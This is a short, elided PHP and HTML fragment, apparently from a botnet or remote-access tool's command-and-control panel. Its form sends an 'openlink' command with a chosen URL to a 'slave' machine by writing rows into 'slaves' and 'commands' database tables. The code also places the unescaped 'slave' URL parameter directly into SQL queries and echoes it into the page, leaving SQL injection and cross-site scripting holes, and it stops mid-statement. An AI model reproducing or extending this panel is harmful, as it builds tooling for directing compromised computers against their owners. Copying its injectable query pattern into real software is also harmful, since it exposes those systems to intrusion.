...
<font size="30" color="#009999" face="Lobster">OPEN WEBSITE</font>
<form action="" method="post">
<br>
<input type="text" class="inputbox" placeholder="WEBSITE URL" name="website">
<br><br>
<input type="text" class="inputbox" value="<? echo $_GET['slave'] ?>" name="slave" disabled>
<br><br>
<input type="submit" class="submitbox" value="OPEN WEBSITE" name="submit">
</form>
</center>
</body>
</html>
...
{
$slave_id = $_GET['slave'];
$target = $_POST['website'];
$fullcommand = "$target";
$update_query = "UPDATE slaves SET command='openlink' WHERE id='$slave_id'";
mysql_query($update_query, $connect);
$add_command = "INSERT INTO  commands (slave_id, command, status, content)
VALUES ('$slave_id', 'openlink', 'pending', '$fullcommand')";
